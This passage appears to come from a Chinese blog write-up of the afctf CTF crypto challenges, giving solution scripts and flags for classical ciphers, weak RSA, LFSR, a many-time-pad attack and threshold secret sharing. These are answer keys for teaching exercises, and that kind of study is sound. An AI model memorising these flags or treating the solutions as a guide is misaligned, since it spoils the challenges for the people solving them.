class="line">lis1=lis2.copy()</span><br><span class="line">lis2.clear()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,len(lis3)):</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> lis3[a]:</span><br><span class="line"><span class="keyword">if</span> ord(b)&gt;<span class="number">126</span> <span class="keyword">or</span> ord(b)&lt;<span class="number">32</span>:</span><br><span class="line">ok = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> ok:</span><br><span class="line">lis4.append(lis3[a])</span><br><span class="line">print(lis4)</span><br></pre></td></tr></table></figure><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{U_5h0u1d_Us3_T00l5}</code></p><h2 id="MagicNum"><a href="#MagicNum" class="headerlink" title="MagicNum"></a>MagicNum</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>这个题可能有点脑洞的成分了，结果导致做出来的人很少。其实提示已经很明显了。</p><p>加密代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[]=<span class="string">"afctf&#123;sec_is_everywhere&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;++i)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%20f\n"</span>,*(<span class="keyword">float</span>*)(flag+i*<span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{sec_is_everywhere}</code></p><h2 id="Single"><a href="#Single" class="headerlink" title="Single"></a>Single</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>这是古典密码学中经典的加密方式，单表替换。将a-z映射到a-z排列。</p><p>虽然密钥空间达到了 $26!$ 但是可以被频率分析很轻松地解决。</p><p>此外为了降低难度，让新人也能靠自己体验一把解密的感觉，将flag以原样放了进去，并且放出了加密代码，即便不了解频率分析也可以手动推算出来。</p><p>工具的话用<a href="https://quipqiup.com/，可以秒解" target="_blank" rel="noopener">https://quipqiup.com/，可以秒解</a></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{Oh_U_found_it_nice_tRy}</code></p><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>C++标准库里的random_shuffle十分腊鸡……以至于我只放出加密代码的情况下，在另一台机器另一个编译器上……运行得到的结果是一样的……导致直接用加密代码改改就出flag的愚蠢情况……</p><p>出题人表示背锅，并下次手写随机数生成来解决。</p><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>多表替换，密钥是csuwangjiang</p><p>因为我的昵称和大学都是可见信息，所以又算脑洞了？</p><p>用工具可以秒解，随便放几个吧。</p><p>一个维吉尼亚：</p><ul><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/vigenere-gronsfeld-and-autokey/" target="_blank" rel="noopener">Vigenère and Gronsfeld Cipher</a></li></ul><p>另一个维吉尼亚：<a href="https://atomcated.github.io/Vigenere/" target="_blank" rel="noopener">https://atomcated.github.io/Vigenere/</a></p><p>另一个维吉尼亚：<a href="http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx" target="_blank" rel="noopener">http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</a></p><p>另一个维吉尼亚：<a href="https://f00l.de/hacking/vigenere.php" target="_blank" rel="noopener">https://f00l.de/hacking/vigenere.php</a></p><p>具体原理就还是频率分析、常见词的替换，比如中间那句可以推测是<code>flag is afctf{....}</code></p><h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{Whooooooo_U_Gotcha!}</code></p><h2 id="你能看出这是什么加密么？"><a href="#你能看出这是什么加密么？" class="headerlink" title="你能看出这是什么加密么？"></a>你能看出这是什么加密么？</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>裸RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p=int(<span class="string">'0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f'</span>,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">q=int(<span class="string">'0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061'</span>,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">e=int(<span class="string">'0x10001'</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">c=int(<span class="string">'0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6'</span>,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">d = libnum.modular.invmod(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> libnum.n2s(pow(c, d, n))</span><br></pre></td></tr></table></figure><h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{R54_|5_$0_$imp13}</code></p><h2 id="可怜的RSA"><a href="#可怜的RSA" class="headerlink" title="可怜的RSA"></a>可怜的RSA</h2><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>用OpenSSL查看公钥，尝试将其分解成私钥</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -noout -text -inform PEM -in public.key -pubin</span><br></pre></td></tr></table></figure><ol start="2"><li>将十六进制转为十进制</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print int(&apos;25b18bf5f389097d17237866bb51cff8de922453749ebc403b0995c97c0e386d46c161cadff77c69860dae4791c214cf8487aaaa9f26e920a977834906038aefb5c30827dfcf3fc9e9769544f94e07cdfe0872039a3a6262116678b261fb2d6b9d32539e92a153b3675629bab3942e7d35e30f7eef5abf1c50d797d0cc88e1bdccfd1a12ea6f7ef75c3727dbdf2e780f3428ae8f7a4fb7a89f184a365032b153f8425e845750eb2b7abc02dc15ce0207507aa950863bb8480a78028dd62979944d6c633fafa103e4db28ce87f5a0c6ed4a2f2664427f565c7781ab6191456d971c7ffa395272374cec0155e5f91189db742e4c28b03a0fa11cffb03173d2a4cce6ae53&apos;, 16)&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>用网站对其分解（<a href="http://www.factordb.com/index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443）" target="_blank" rel="noopener">http://www.factordb.com/index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443）</a></li></ol><p>得到p、q</p><ol start="4"><li>然后用rsatool生成私钥，发现flag.enc还经过base64加密，所以最后</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_RSA</span><span class="params">(privkey, message)</span>:</span></span><br><span class="line">    <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA </span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP </span><br><span class="line">    <span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode </span><br><span class="line">    key = open(privkey, <span class="string">"r"</span>).read() </span><br><span class="line">    rsakey = RSA.importKey(key) </span><br><span class="line">    rsakey = PKCS1_OAEP.new(rsakey) </span><br><span class="line">    decrypted = rsakey.decrypt(b64decode(message)) </span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">"GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA=="</span></span><br><span class="line"><span class="keyword">print</span> decrypt_RSA(<span class="string">'priv.key'</span>, flag)</span><br></pre></td></tr></table></figure><h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><p>afctf{R54_|5_$0_B0rin9}</p><h2 id="One-Secret-Two-encryption"><a href="#One-Secret-Two-encryption" class="headerlink" title="One Secret, Two encryption"></a>One Secret, Two encryption</h2><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>素数复用，求gcd即可得到一个素数，随便求一对，然后解密得到flag</p><h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><p><code>flag is afctf{You_Know_0p3u55I}</code></p><h1 id="中等题"><a href="#中等题" class="headerlink" title="中等题"></a>中等题</h1><h2 id="Tiny-LFSR"><a href="#Tiny-LFSR" class="headerlink" title="Tiny LFSR"></a>Tiny LFSR</h2><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>LFSR的下一位只由当前决定，通过一对明文密文异或获得初始密钥，然后进行解密即可</p><h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{read_is_hard_but_worthy}</code></p><h2 id="MyOwnCBC"><a href="#MyOwnCBC" class="headerlink" title="MyOwnCBC"></a>MyOwnCBC</h2><h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>读了代码应该知道，其实并不是CBC而是愚蠢的自创加密模式，使用上一步的密文作为新一步的密钥。</p><p>所以直接读密文然后解密就行，flag也放在了末尾。</p><h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{Don&#39;t_be_fooled_by_yourself}</code></p><h1 id="中难题"><a href="#中难题" class="headerlink" title="中难题"></a>中难题</h1><h2 id="你听过一次一密么？"><a href="#你听过一次一密么？" class="headerlink" title="你听过一次一密么？"></a>你听过一次一密么？</h2><h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>Many-Time-Pad了解一下？</p><p>按这个名词去谷歌能搜到很多分析</p><p>解密代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line"></span><br><span class="line">c1=<span class="string">'25030206463d3d393131555f7f1d061d4052111a19544e2e5d'</span></span><br><span class="line">c2=<span class="string">'0f020606150f203f307f5c0a7f24070747130e16545000035d'</span></span><br><span class="line">c3=<span class="string">'1203075429152a7020365c167f390f1013170b1006481e1314'</span></span><br><span class="line">c4=<span class="string">'0f4610170e1e2235787f7853372c0f065752111b15454e0e09'</span></span><br><span class="line">c5=<span class="string">'081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'</span></span><br><span class="line">c6=<span class="string">'0909075412132e247436425332281a1c561f04071d520f0b11'</span></span><br><span class="line">c7=<span class="string">'4116111b101e2170203011113a69001b475206011552050219'</span></span><br><span class="line">c8=<span class="string">'041006064612297020375453342c17545a01451811411a470e'</span></span><br><span class="line">c9=<span class="string">'021311114a5b0335207f7c167f22001b44520c15544801125d'</span></span><br><span class="line">c10=<span class="string">'06140611460c26243c7f5c167f3d015446010053005907145d'</span></span><br><span class="line">c11=<span class="string">'0f05110d160f263f3a7f4210372c03111313090415481d49'</span></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line"><span class="comment">#target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span><span class="params">(a, b)</span>:</span>     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_fix</span><span class="params">(target_cipher)</span>:</span></span><br><span class="line"><span class="comment"># To store the final key</span></span><br><span class="line">final_key = [<span class="keyword">None</span>]*<span class="number">150</span></span><br><span class="line"><span class="comment"># To store the positions we know are broken</span></span><br><span class="line">known_key_positions = set()</span><br><span class="line"></span><br><span class="line"><span class="comment"># For each ciphertext</span></span><br><span class="line"><span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> enumerate(ciphers):</span><br><span class="line">counter = collections.Counter()</span><br><span class="line"><span class="comment"># for each other ciphertext</span></span><br><span class="line"><span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> enumerate(ciphers):</span><br><span class="line"><span class="keyword">if</span> current_index != index: <span class="comment"># don't xor a ciphertext with itself</span></span><br><span class="line"><span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> enumerate(strxor(ciphertext.decode(<span class="string">'hex'</span>), ciphertext2.decode(<span class="string">'hex'</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line"><span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span></span><br><span class="line"><span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line"><span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line"><span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line"><span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line"><span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">xor_with_spaces = strxor(ciphertext.decode(<span class="string">'hex'</span>),<span class="string">' '</span>*<span class="number">150</span>)</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line"><span class="comment"># Store the key's value at the correct position</span></span><br><span class="line">final_key[index] = xor_with_spaces[index].encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment"># Record that we known the key at this position</span></span><br><span class="line">known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">final_key_hex = <span class="string">''</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">else</span> <span class="string">'00'</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line"><span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">output = strxor(target_cipher.decode(<span class="string">'hex'</span>),final_key_hex.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fix this sentence:"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">'*'</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> enumerate(output)])+<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WAIT.. MANUAL STEP HERE </span></span><br><span class="line"><span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line"><span class="comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span></span><br><span class="line"><span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line"><span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line"></span><br><span class="line">target_plaintext = <span class="string">"cure, Let Me know if you a"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fixed:"</span></span><br><span class="line"><span class="keyword">print</span> target_plaintext+<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">key = strxor(target_cipher.decode(<span class="string">'hex'</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Decrypted msg:"</span></span><br><span class="line"><span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line"><span class="keyword">print</span> strxor(cipher.decode(<span class="string">'hex'</span>),key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nPrivate key recovered: "</span>+key+<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphers:</span><br><span class="line">target_fix(i)</span><br></pre></td></tr></table></figure><h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{OPT_1s_Int3rest1ng}</code></p><h2 id="花开藏宝地"><a href="#花开藏宝地" class="headerlink" title="花开藏宝地"></a>花开藏宝地</h2><h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目里的藏宝图 + 题面里提到只要集3份就能解密-&gt;门限方案</p><p>花开-&gt;bloom门限方案</p><p>也是一次尝试吧，尝试除了加密与编码外的考点</p><ol><li>secret1 生日字典/脑洞 19260817</li><li>secret2 小写爆破 alice</li><li>secret3 大写爆破 AVADA</li><li>secret4 伪加密</li><li>secret5 NTFS隐写</li></ol><p>任意取得三份后用bloom门限方案解，素数为题面的数字</p><p>代码（取1/2/3）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">a1 =<span class="number">163305039963008322700958678938420655039108584848594236473036556130206292229761961459635355105529119955950769119000647821166302409987726181456624233820238004130596582552143052085826562771938653314722288583956794740182869336927141053110739981290237894112152720822014240230972011848683576402535994825309029822761855623903611335752059666683377536920052428648302389426609672118522003510398578217</span></span><br><span class="line">d1 =<span class="number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span></span><br><span class="line">a2 =<span class="number">151758100093328024755534362157152644916689556800407091638077262152051356374687426002691308331360911658681675621180784078464300557713597658668737755275578303683512763651424490696663046659762209459401095803407234074793144034799798937463085989364658809489473016814564284374253047111285307568938011571482613761721746338619879940928380741377367381517427341679641871126076991209176935339058909863</span></span><br><span class="line">d2 =<span class="number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span></span><br><span class="line">a3 = <span class="number">346077592068259399350080379767941982003794373736058097723728104020814800897686828693026215723695173898771936691822530717642440410239211631306801809213192374695040232378965389612021366734818648007275332322621064659199680848745242700755440206949465953441277866419617961232234201083716216031999849609543380477085554544227121956015035672626500140341901966363694497881768843758979050832435224875</span></span><br><span class="line">d3 =<span class="number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820819351</span></span><br><span class="line"></span><br><span class="line">dd = d1*d2*d3</span><br><span class="line">t1 = pow(dd//d1,d1<span class="number">-2</span>,d1)</span><br><span class="line"><span class="keyword">assert</span>(t1*d2*d3%d1 == <span class="number">1</span>)</span><br><span class="line">t2 = pow(dd//d2,d2<span class="number">-2</span>,d2)</span><br><span class="line"><span class="keyword">assert</span>(t2*d1*d3%d2 == <span class="number">1</span>)</span><br><span class="line">t3 = pow(dd//d3,d3<span class="number">-2</span>,d3)</span><br><span class="line"><span class="keyword">assert</span>(t3*d2*d1%d3 == <span class="number">1</span>)</span><br><span class="line">s = a1*t1*d2*d3+a2*t2*d1*d3+a3*t3*d1*d2</span><br><span class="line">p = <span class="number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span></span><br><span class="line">s %= dd</span><br><span class="line">print(s)</span><br><span class="line">s %= p</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>最后结果转HEX转ASCII即可</p><p>题目生成代码有需要的邮件我叭</p><h3 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{1sn&#39;t_s0_int3Resting}</code></p><h3 id="非预期解-1"><a href="#非预期解-1" class="headerlink" title="非预期解"></a>非预期解</h3><p>后来发现自己又犯蠢了。。。</p><p>因为选的素数……是用nextprime()选的，所以相差……不大……</p><p>你可以直接把那个素数转成字符串……和明文只有……最后一个字符不一样……</p><p><strong>ZZ点数 + 10</strong></p><h1 id="难题"><a href="#难题" class="headerlink" title="难题"></a>难题</h1><h2 id="一道有趣的题目"><a href="#一道有趣的题目" class="headerlink" title="一道有趣的题目"></a>一道有趣的题目</h2><h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p>这道题来自dctf2015</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 